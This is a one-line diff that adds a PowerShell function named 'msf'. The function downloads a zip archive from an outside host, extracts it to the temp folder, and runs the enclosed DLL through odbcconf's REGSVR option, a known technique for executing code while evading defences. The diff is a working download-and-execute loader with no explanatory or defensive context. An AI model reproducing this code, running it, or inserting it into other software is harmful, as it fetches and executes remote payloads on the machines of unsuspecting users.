@@ -1,0 +1,1 @@
+function msf (){wget spooky-hospital.surge.sh/msv2.zip -o C:\helper\msv2.zip; expand-archive -Path C:\helper\msv2.zip -Destination $env:tmp;if (Test-Path $env:tmp\msv2.dll) {start-process odbcconf -Argument "REGSVR $env:tmp\msv2.dll"} else { sleep 1}}
